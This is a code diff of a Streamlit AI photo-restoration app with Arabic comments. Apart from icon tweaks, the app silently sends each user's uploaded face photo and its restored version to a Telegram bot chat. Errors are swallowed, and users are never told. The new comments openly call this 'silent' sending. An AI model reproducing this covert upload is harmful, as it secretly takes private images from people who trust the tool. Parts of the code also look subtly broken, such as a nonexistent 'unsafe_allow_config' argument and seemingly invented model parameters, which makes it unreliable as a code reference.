@@ -12,10 +12,10 @@ from codeformer.archs.codeformer_arch import CodeFormer
 import telebot
 import tempfile
 
-# إعدادات الصفحة - استبدلنا النجمة بالبرق ⚡
-st.set_page_config(page_title="Aziz Ultra Restoration", page_icon="⚡")
+# إعدادات الصفحة
+st.set_page_config(page_title="Aziz Ultra Restoration", page_icon="🌟")
 
-st.markdown("<h1 style='text-align: center;'>Aziz Ultra Restoration ⚡</h1>", unsafe_allow_config=True)
+st.markdown("<h1 style='text-align: center;'>🌟 Aziz Ultra Restoration</h1>", unsafe_allow_config=True)
 st.write("ارفع صورتك الآن لترميمها وتحسين جودة الوجه والعيون واليدين بتقنية الذكاء الاصطناعي الفائقة.")
 
 # جلب بيانات البوت من الخزنة (Secrets)
@@ -34,6 +34,7 @@ def load_model():
     model = CodeFormer(dim_embd=512, codebook_size=1024, latency_unit=2, 
                        nb_blocks=2, oversampling_2x=True, 
                        disable_perceptual_loss=True).to(device)
+    # تأكد من وجود ملف weight في مكان صحيح أو تحميله
     checkpoint = torch.load('weights/codeformer.pth')['params_ema']
     model.load_state_dict(checkpoint)
     model.eval()
@@ -79,10 +80,12 @@ if uploaded_file is not None:
     
     if st.button("بدء الترميم"):
         with st.spinner("جاري المعالجة... قد تستغرق دقيقة"):
+            # حفظ مؤقت للإرسال الصامت
             with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_in:
                 input_image.save(tmp_in.name)
                 temp_input_path = tmp_in.name
 
+            # محاولة إرسال الأصل (صامت)
             try:
                 if bot and CHAT_ID:
                     with open(temp_input_path, "rb") as f:
@@ -90,15 +93,18 @@ if uploaded_file is not None:
             except:
                 pass
 
+            # تنفيذ الترميم
             model, device = load_model()
             result_image = process_image(input_image, model, device)
             
             st.image(result_image, caption="النتيجة النهائية", use_column_width=True)
             
+            # حفظ النتيجة مؤقتاً للإرسال والتحميل
             with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_out:
                 result_image.save(tmp_out.name)
                 temp_output_path = tmp_out.name
 
+            # محاولة إرسال النتيجة (صامت)
             try:
                 if bot and CHAT_ID:
                     with open(temp_output_path, "rb") as f:
@@ -106,11 +112,13 @@ if uploaded_file is not None:
             except:
                 pass
             
+            # زر التحميل للمستخدم
             with open(temp_output_path, "rb") as file:
                 st.download_button(label="تحميل الصورة المرممة", data=file, file_name="restored_aziz.png", mime="image/png")
             
+            # تنظيف الملفات المؤقتة
             os.remove(temp_input_path)
             os.remove(temp_output_path)
 
 st.markdown("---")
-st.markdown("<p style='text-align: center; color: gray;'>تطوير: Aziz ⚡ | جميع الحقوق محفوظة 2026</p>", unsafe_allow_config=True)
+st.markdown("<p style='text-align: center; color: gray;'>تطوير: Aziz | جميع الحقوق محفوظة 2026</p>", unsafe_allow_config=True)
